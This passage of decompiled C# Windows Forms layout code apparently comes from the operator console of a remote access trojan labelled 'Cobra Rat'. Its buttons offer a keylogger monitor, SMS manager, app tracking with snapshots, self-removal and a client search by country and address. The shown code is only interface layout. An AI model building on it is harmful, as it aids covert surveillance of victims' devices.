		this.DGVTRK.RowHeadersVisible = false;
		dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle15.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle15.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DGVTRK.RowsDefaultCellStyle = dataGridViewCellStyle15;
		this.DGVTRK.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVTRK.ShowCellToolTips = false;
		this.DGVTRK.Size = new System.Drawing.Size(311, 351);
		this.DGVTRK.TabIndex = 4;
		this.DGVTRK.Tag = "b";
		this.TRKctx.BackColor = System.Drawing.Color.Black;
		this.TRKctx.Font = new System.Drawing.Font("Calibri", 12f);
		this.TRKctx.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.TRKctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.ToolStripMenuItem24, this.ToolStripMenuItem19, this.ToolStripMenuItem21, this.ToolStripMenuItem22, this.ToolStripMenuItem23, this.ToolStripMenuItem20 });
		this.TRKctx.Name = "ctxconnection";
		this.TRKctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.TRKctx.Size = new System.Drawing.Size(202, 256);
		this.ToolStripMenuItem24.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem24.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem24.Image");
		this.ToolStripMenuItem24.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem24.Name = "ToolStripMenuItem24";
		this.ToolStripMenuItem24.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem24.Text = "Add App";
		this.ToolStripMenuItem19.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem19.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem19.Image");
		this.ToolStripMenuItem19.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem19.Name = "ToolStripMenuItem19";
		this.ToolStripMenuItem19.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem19.Text = "Snapshots";
		this.ToolStripMenuItem21.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem21.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem21.Image");
		this.ToolStripMenuItem21.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem21.Name = "ToolStripMenuItem21";
		this.ToolStripMenuItem21.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem21.Text = "Records";
		this.ToolStripMenuItem22.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem22.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem22.Image");
		this.ToolStripMenuItem22.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem22.Name = "ToolStripMenuItem22";
		this.ToolStripMenuItem22.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem22.Text = "Clear Snapshots";
		this.ToolStripMenuItem23.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem23.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem23.Image");
		this.ToolStripMenuItem23.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem23.Name = "ToolStripMenuItem23";
		this.ToolStripMenuItem23.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem23.Text = "Clear Records";
		this.ToolStripMenuItem20.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem20.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem20.Image");
		this.ToolStripMenuItem20.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem20.Name = "ToolStripMenuItem20";
		this.ToolStripMenuItem20.Size = new System.Drawing.Size(201, 42);
		this.ToolStripMenuItem20.Text = "Stop tracking";
		this.Panel17.BackColor = System.Drawing.Color.Black;
		this.Panel17.Controls.Add(this.Label5);
		this.Panel17.Controls.Add(this.combodatestrack);
		this.Panel17.Controls.Add(this.DrakeUIAvatar11);
		this.Panel17.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel17.Location = new System.Drawing.Point(0, 0);
		this.Panel17.Margin = new System.Windows.Forms.Padding(2);
		this.Panel17.Name = "Panel17";
		this.Panel17.Size = new System.Drawing.Size(311, 24);
		this.Panel17.TabIndex = 41;
		this.Label5.BackColor = System.Drawing.Color.Black;
		this.Label5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label5.Location = new System.Drawing.Point(26, 0);
		this.Label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(175, 24);
		this.Label5.TabIndex = 40;
		this.Label5.Text = "Tracking Apps";
		this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.combodatestrack.AllowDrop = true;
		this.combodatestrack.BackColor = System.Drawing.Color.Transparent;
		this.combodatestrack.CausesValidation = false;
		this.combodatestrack.Dock = System.Windows.Forms.DockStyle.Right;
		this.combodatestrack.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combodatestrack.FillColor = System.Drawing.Color.Black;
		this.combodatestrack.Font = new System.Drawing.Font("Calibri", 11f);
		this.combodatestrack.FormattingEnabled = true;
		this.combodatestrack.ItemHeight = 20;
		this.combodatestrack.Location = new System.Drawing.Point(201, 0);
		this.combodatestrack.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combodatestrack.MinimumSize = new System.Drawing.Size(47, 0);
		this.combodatestrack.Name = "combodatestrack";
		this.combodatestrack.Padding = new System.Windows.Forms.Padding(0, 0, 22, 0);
		this.combodatestrack.RectColor = System.Drawing.Color.SkyBlue;
		this.combodatestrack.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.combodatestrack.Size = new System.Drawing.Size(110, 25);
		this.combodatestrack.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combodatestrack.StyleCustomMode = true;
		this.combodatestrack.TabIndex = 41;
		this.combodatestrack.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeUIAvatar11.AvatarSize = 25;
		this.DrakeUIAvatar11.BackColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar11.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar11.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar11.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar11.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar11.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIAvatar11.Name = "DrakeUIAvatar11";
		this.DrakeUIAvatar11.Size = new System.Drawing.Size(26, 24);
		this.DrakeUIAvatar11.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar11.StyleCustomMode = true;
		this.DrakeUIAvatar11.Symbol = 61561;
		this.DrakeUIAvatar11.SymbolSize = 25;
		this.DrakeUIAvatar11.TabIndex = 36;
		this.notifiform.SetToolTip(this.DrakeUIAvatar11, "Refresh");
		this.recordsShowpanel.BackColor = System.Drawing.Color.BlanchedAlmond;
		this.recordsShowpanel.Controls.Add(this.recordshowtext);
		this.recordsShowpanel.Controls.Add(this.DrakeUIButtonIcon20);
		this.recordsShowpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.recordsShowpanel.Location = new System.Drawing.Point(0, 0);
		this.recordsShowpanel.Margin = new System.Windows.Forms.Padding(2);
		this.recordsShowpanel.Name = "recordsShowpanel";
		this.recordsShowpanel.Size = new System.Drawing.Size(311, 375);
		this.recordsShowpanel.TabIndex = 42;
		this.recordshowtext.BackColor = System.Drawing.Color.Black;
		this.recordshowtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.recordshowtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.recordshowtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.recordshowtext.Location = new System.Drawing.Point(0, 32);
		this.recordshowtext.Margin = new System.Windows.Forms.Padding(2);
		this.recordshowtext.Multiline = true;
		this.recordshowtext.Name = "recordshowtext";
		this.recordshowtext.ReadOnly = true;
		this.recordshowtext.Size = new System.Drawing.Size(311, 343);
		this.recordshowtext.TabIndex = 34;
		this.DrakeUIButtonIcon20.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon20.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeUIButtonIcon20.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon20.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon20.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButtonIcon20.Name = "DrakeUIButtonIcon20";
		this.DrakeUIButtonIcon20.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon20.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon20.Size = new System.Drawing.Size(311, 32);
		this.DrakeUIButtonIcon20.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon20.StyleCustomMode = true;
		this.DrakeUIButtonIcon20.Symbol = 61527;
		this.DrakeUIButtonIcon20.SymbolSize = 25;
		this.DrakeUIButtonIcon20.TabIndex = 33;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon20, "Exit");
		this.applicationsbtn.CircleRectWidth = 30;
		this.applicationsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.applicationsbtn.FillColor = System.Drawing.Color.Black;
		this.applicationsbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.FillPressColor = System.Drawing.Color.Black;
		this.applicationsbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.applicationsbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.Location = new System.Drawing.Point(271, 43);
		this.applicationsbtn.Name = "applicationsbtn";
		this.applicationsbtn.RectColor = System.Drawing.Color.Black;
		this.applicationsbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.applicationsbtn.Size = new System.Drawing.Size(32, 25);
		this.applicationsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.applicationsbtn.StyleCustomMode = true;
		this.applicationsbtn.Symbol = 61819;
		this.applicationsbtn.SymbolSize = 30;
		this.applicationsbtn.TabIndex = 20;
		this.notifiform.SetToolTip(this.applicationsbtn, "Applications");
		this.keyloggerbtn.CircleRectWidth = 30;
		this.keyloggerbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.keyloggerbtn.FillColor = System.Drawing.Color.Black;
		this.keyloggerbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.FillPressColor = System.Drawing.Color.Black;
		this.keyloggerbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.keyloggerbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.Location = new System.Drawing.Point(8, 43);
		this.keyloggerbtn.Name = "keyloggerbtn";
		this.keyloggerbtn.RectColor = System.Drawing.Color.Black;
		this.keyloggerbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.keyloggerbtn.Size = new System.Drawing.Size(32, 25);
		this.keyloggerbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.keyloggerbtn.StyleCustomMode = true;
		this.keyloggerbtn.Symbol = 61724;
		this.keyloggerbtn.SymbolSize = 30;
		this.keyloggerbtn.TabIndex = 21;
		this.notifiform.SetToolTip(this.keyloggerbtn, "Keylogger Monitor");
		this.DrakeUIButtonIcon5.CircleRectWidth = 30;
		this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.DrakeUIButtonIcon5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(196, 74);
		this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
		this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(32, 25);
		this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon5.StyleCustomMode = true;
		this.DrakeUIButtonIcon5.Symbol = 61944;
		this.DrakeUIButtonIcon5.SymbolSize = 30;
		this.DrakeUIButtonIcon5.TabIndex = 35;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon5, "Self Remove");
		this.smsbtn.CircleRectWidth = 30;
		this.smsbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.smsbtn.FillColor = System.Drawing.Color.Black;
		this.smsbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.FillPressColor = System.Drawing.Color.Black;
		this.smsbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.smsbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.Location = new System.Drawing.Point(8, 74);
		this.smsbtn.Name = "smsbtn";
		this.smsbtn.RectColor = System.Drawing.Color.Black;
		this.smsbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.smsbtn.Size = new System.Drawing.Size(32, 25);
		this.smsbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.smsbtn.StyleCustomMode = true;
		this.smsbtn.Symbol = 61664;
		this.smsbtn.SymbolSize = 30;
		this.smsbtn.TabIndex = 18;
		this.notifiform.SetToolTip(this.smsbtn, "SMS Manager");
		this.Panel6.BackColor = System.Drawing.Color.Black;
		this.Panel6.Controls.Add(this.clearsrchbtn);
		this.Panel6.Controls.Add(this.searchtext);
		this.Panel6.Controls.Add(this.searchbtn);
		this.Panel6.Controls.Add(this.Panel18);
		this.Panel6.Controls.Add(this.DrakeUIAvatar1);
		this.Panel6.Controls.Add(this.TCavatar);
		this.Panel6.Controls.Add(this.uncheckbtn);
		this.Panel6.Controls.Add(this.clientfoldrbtn);
		this.Panel6.Controls.Add(this.DrakeUIAvatar4);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel6.Location = new System.Drawing.Point(8, 4);
		this.Panel6.Name = "Panel6";
		this.Panel6.Size = new System.Drawing.Size(1057, 25);
		this.Panel6.TabIndex = 22;
		this.clearsrchbtn.AvatarSize = 25;
		this.clearsrchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clearsrchbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.clearsrchbtn.FillColor = System.Drawing.Color.Black;
		this.clearsrchbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.clearsrchbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.clearsrchbtn.Location = new System.Drawing.Point(367, 0);
		this.clearsrchbtn.Name = "clearsrchbtn";
		this.clearsrchbtn.Size = new System.Drawing.Size(22, 25);
		this.clearsrchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clearsrchbtn.StyleCustomMode = true;
		this.clearsrchbtn.Symbol = 77;
		this.clearsrchbtn.SymbolSize = 33;
		this.clearsrchbtn.TabIndex = 33;
		this.clearsrchbtn.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.notifiform.SetToolTip(this.clearsrchbtn, "Clear Search");
		this.clearsrchbtn.Visible = false;
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Left;
		this.searchtext.FillColor = System.Drawing.Color.Black;
		this.searchtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.searchtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.searchtext.Location = new System.Drawing.Point(122, 0);
		this.searchtext.Margin = new System.Windows.Forms.Padding(4);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = "searchtext";
		this.searchtext.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.searchtext.RectColor = System.Drawing.Color.SkyBlue;
		this.searchtext.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.searchtext.Size = new System.Drawing.Size(245, 27);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.StyleCustomMode = true;
		this.searchtext.TabIndex = 0;
		this.searchtext.Watermark = "Search By Name,Country,Addres,...";
		this.searchbtn.AvatarSize = 25;
		this.searchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.searchbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.searchbtn.FillColor = System.Drawing.Color.Black;
		this.searchbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.searchbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.searchbtn.Location = new System.Drawing.Point(84, 0);
		this.searchbtn.Name = "searchbtn";
		this.searchbtn.Size = new System.Drawing.Size(38, 25);
		this.searchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchbtn.StyleCustomMode = true;
		this.searchbtn.Symbol = 85;
		this.searchbtn.SymbolSize = 30;
		this.searchbtn.TabIndex = 1;
		this.Panel18.BackColor = System.Drawing.Color.Black;
		this.Panel18.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel18.Location = new System.Drawing.Point(70, 0);
		this.Panel18.Margin = new System.Windows.Forms.Padding(2);
		this.Panel18.Name = "Panel18";
		this.Panel18.Size = new System.Drawing.Size(14, 25);
		this.Panel18.TabIndex = 36;
		this.DrakeUIAvatar1.AvatarSize = 25;
		this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(35, 0);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(35, 25);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.StyleCustomMode = true;
		this.DrakeUIAvatar1.Symbol = 61508;
		this.DrakeUIAvatar1.SymbolSize = 25;
		this.DrakeUIAvatar1.TabIndex = 34;
		this.notifiform.SetToolTip(this.DrakeUIAvatar1, "Edit Clients information");
		this.TCavatar.BackColor = System.Drawing.Color.Transparent;
		this.TCavatar.Dock = System.Windows.Forms.DockStyle.Right;
		this.TCavatar.Location = new System.Drawing.Point(967, 0);
		this.TCavatar.Name = "TCavatar";
		this.TCavatar.Size = new System.Drawing.Size(40, 25);
		this.TCavatar.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.TCavatar.TabIndex = 21;
		this.TCavatar.TabStop = false;
		this.uncheckbtn.CircleRectWidth = 30;
		this.uncheckbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.uncheckbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.uncheckbtn.FillColor = System.Drawing.Color.Black;
		this.uncheckbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.uncheckbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.Location = new System.Drawing.Point(1007, 0);
		this.uncheckbtn.Name = "uncheckbtn";
		this.uncheckbtn.RectColor = System.Drawing.Color.Black;
		this.uncheckbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.uncheckbtn.Size = new System.Drawing.Size(25, 25);
		this.uncheckbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.uncheckbtn.StyleCustomMode = true;
		this.uncheckbtn.Symbol = 61453;
		this.uncheckbtn.SymbolSize = 20;
		this.uncheckbtn.TabIndex = 29;
		this.notifiform.SetToolTip(this.uncheckbtn, "un-select client");
		this.uncheckbtn.Visible = false;
		this.clientfoldrbtn.CircleRectWidth = 30;
		this.clientfoldrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clientfoldrbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.clientfoldrbtn.FillColor = System.Drawing.Color.Black;
		this.clientfoldrbtn.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.Font = new System.Drawing.Font("Calibri", 9.5f);
		this.clientfoldrbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.Location = new System.Drawing.Point(1032, 0);
		this.clientfoldrbtn.Name = "clientfoldrbtn";
		this.clientfoldrbtn.RectColor = System.Drawing.Color.Black;
		this.clientfoldrbtn.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.RectPressColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.clientfoldrbtn.Size = new System.Drawing.Size(25, 25);
		this.clientfoldrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clientfoldrbtn.StyleCustomMode = true;
		this.clientfoldrbtn.Symbol = 61563;
		this.clientfoldrbtn.SymbolSize = 30;
		this.clientfoldrbtn.TabIndex = 30;
		this.notifiform.SetToolTip(this.clientfoldrbtn, "Client Folder");
		this.clientfoldrbtn.Visible = false;
		this.DrakeUIAvatar4.AvatarSize = 25;
		this.DrakeUIAvatar4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIAvatar4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar4.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIAvatar4.Name = "DrakeUIAvatar4";
		this.DrakeUIAvatar4.Size = new System.Drawing.Size(35, 25);
		this.DrakeUIAvatar4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar4.StyleCustomMode = true;
		this.DrakeUIAvatar4.Symbol = 61912;
		this.DrakeUIAvatar4.SymbolSize = 25;
		this.DrakeUIAvatar4.TabIndex = 35;
		this.notifiform.SetToolTip(this.DrakeUIAvatar4, "Send Notification");
		this.Panel19.BackColor = System.Drawing.Color.Black;
		this.Panel19.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel19.Location = new System.Drawing.Point(8, 0);
		this.Panel19.Margin = new System.Windows.Forms.Padding(2);
		this.Panel19.Name = "Panel19";
		this.Panel19.Size = new System.Drawing.Size(1057, 4);
		this.Panel19.TabIndex = 37;
		this.Panel7.BackColor = System.Drawing.Color.Black;
		this.Panel7.Controls.Add(this.label16);
		this.Panel7.Controls.Add(this.DrakeUIButtonIcon9);
		this.Panel7.Controls.Add(this.DrakeUIButtonIcon8);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel7.Location = new System.Drawing.Point(8, 544);
		this.Panel7.Name = "Panel7";
		this.Panel7.Size = new System.Drawing.Size(1057, 25);
		this.Panel7.TabIndex = 23;
		this.label16.Dock = System.Windows.Forms.DockStyle.Right;
		this.label16.Font = new System.Drawing.Font("Times New Roman", 10f);
		this.label16.ForeColor = System.Drawing.Color.SkyBlue;
		this.label16.Location = new System.Drawing.Point(947, 0);
		this.label16.Name = "label16";
		this.label16.Size = new System.Drawing.Size(110, 25);
		this.label16.TabIndex = 20;
		this.label16.Text = "Cobra Rat";
		this.label16.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIButtonIcon9.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon9.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon9.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon9.FillSelectedColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DrakeUIButtonIcon9.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon9.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.Location = new System.Drawing.Point(40, 0);
		this.DrakeUIButtonIcon9.Name = "DrakeUIButtonIcon9";
		this.DrakeUIButtonIcon9.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon9.Size = new System.Drawing.Size(44, 25);
		this.DrakeUIButtonIcon9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon9.StyleCustomMode = true;
		this.DrakeUIButtonIcon9.Symbol = 61539;
		this.DrakeUIButtonIcon9.SymbolSize = 25;
		this.DrakeUIButtonIcon9.TabIndex = 19;
		this.notifiform.SetToolTip(this.DrakeUIButtonIcon9, "Go To Bottom");
		this.DrakeUIButtonIcon8.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon8.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon8.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon8.FillHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon8.FillSelectedColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DrakeUIButtonIcon8.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon8.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButtonIcon8.Name = "DrakeUIButtonIcon8";
		this.DrakeUIButtonIcon8.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.RectHoverColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.RectPressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.RectSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon8.Size = new System.Drawing.Size(40, 25);
		this.DrakeUIButtonIcon8.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon8.StyleCustomMode = true;
		this.DrakeUIButtonIcon8.Symbol = 61538;
		this.DrakeUIButtonIcon8.SymbolSize = 25;
		this.DrakeUIButtonIcon8.TabIndex = 18;
